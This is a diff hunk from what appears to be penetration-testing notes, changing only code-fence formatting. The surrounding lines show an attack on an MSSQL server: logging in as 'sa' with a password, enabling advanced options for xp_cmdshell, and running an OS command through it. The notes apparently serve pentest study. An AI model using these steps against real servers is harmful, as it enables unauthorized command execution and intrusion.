@@ -61,12 +61,12 @@ OS=[Windows Server 2003 3790 Service Pack 1] Server=[Windows Server 2003 5.2]
 >sqsh -S 10.0.0.1 -U sa -P fdasjkl3
 
 ## If xp_cmdshell is not turned on then you have to enable it. This requires "advanced options" to be on:
-'''
+```
 exec sp_configure ‘show advanced options’, 1
 go
 reconfigure
 go
-'''
+```
 
 # Output directory of C:\
 > xp_cmdshell 'dir C:\'
